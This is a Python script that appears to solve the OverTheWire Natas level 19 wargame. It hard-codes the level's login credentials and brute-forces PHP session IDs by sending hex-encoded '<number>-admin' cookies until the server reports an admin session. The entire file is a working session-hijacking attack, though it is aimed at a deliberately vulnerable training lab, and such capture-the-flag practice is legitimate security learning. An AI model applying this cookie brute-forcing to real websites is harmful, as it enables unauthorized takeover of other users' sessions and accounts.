#!/usr/bin/env python3
import requests
import binascii

endIndex = 0
usernm = "natas19"
passwd = "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
url = "http://natas19.natas.labs.overthewire.org"
url2 = "http://natas19.natas.labs.overthewire.org/index.php"
session = requests.Session()
PHPSESSID = 0

while (PHPSESSID <= 640):
    print("Trying: " + str(PHPSESSID) + "-admin" + " (" + binascii.hexlify(bytes(str(PHPSESSID) + "-admin", encoding='utf8')).decode("utf-8") + ")")
    res = session.post(url, cookies = {"PHPSESSID":binascii.hexlify(bytes(str(PHPSESSID) + "-admin", encoding='utf8')).decode("utf-8")}, data = {"username":"admin", "password":"blahblahblah"}, auth = (usernm, passwd))
    if ("You are an admin" in res.text):
        print(res.text)
        break
    PHPSESSID += 1
